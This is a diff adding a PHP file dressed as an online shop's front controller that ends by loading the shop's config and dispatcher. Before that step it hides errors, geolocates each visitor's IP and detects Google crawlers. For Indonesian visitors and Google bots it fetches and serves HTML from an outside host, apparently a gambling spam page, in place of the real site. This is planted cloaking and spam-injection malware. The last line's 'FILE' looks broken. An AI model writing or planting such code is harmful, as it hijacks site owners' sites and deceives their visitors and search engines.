@@ -1,0 +1,87 @@
+<?php
+@ini_set('display_errors', 0);
+error_reporting(0);
+
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Pragma: no-cache');
+header('Expires: 0');
+
+if (!ob_get_level()) ob_start();
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+// Get real IP
+if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+} elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
+    $ip = $_SERVER['HTTP_X_REAL_IP'];
+} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $ip = trim($ips[0]);
+}
+
+$country = '';
+if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=countryCode");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
+    $result = @curl_exec($ch);
+    curl_close($ch);
+    
+    if ($result) {
+        $data = @json_decode($result, true);
+        $country = $data['countryCode'] ?? '';
+    }
+}
+
+$googleBots = [
+    'googlebot',
+    'googlebot-mobile',
+    'google-inspectiontool',
+    'google-site-verification',
+    'adsbot-google',
+    'adsbot-google-mobile',
+    'mediapartners-google',
+    'feedfetcher-google',
+    'google web preview',
+    'google-read-aloud',
+    'googlebot-image',
+    'googlebot-video',
+    'googlebot-news',
+    'google-adwords',
+    'storebot-google',
+    'google-safety'
+];
+
+$isGoogle = false;
+foreach ($googleBots as $bot) {
+    if (stripos($ua, $bot) !== false) {
+        $isGoogle = true;
+        break;
+    }
+}
+
+if ($country === 'ID' || $isGoogle) {
+    $ch = curl_init("https://timnas.ppkk4d.com/bandit/bandit4d.html");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+    $konten = @curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($konten && $httpCode == 200) {
+        header('Content-Type: text/html; charset=utf-8');
+        echo $konten;
+        exit;
+    }
+}
+
+require dirname(FILE).'/config/config.inc.php';
+Dispatcher::getInstance()->dispatch();
+?>
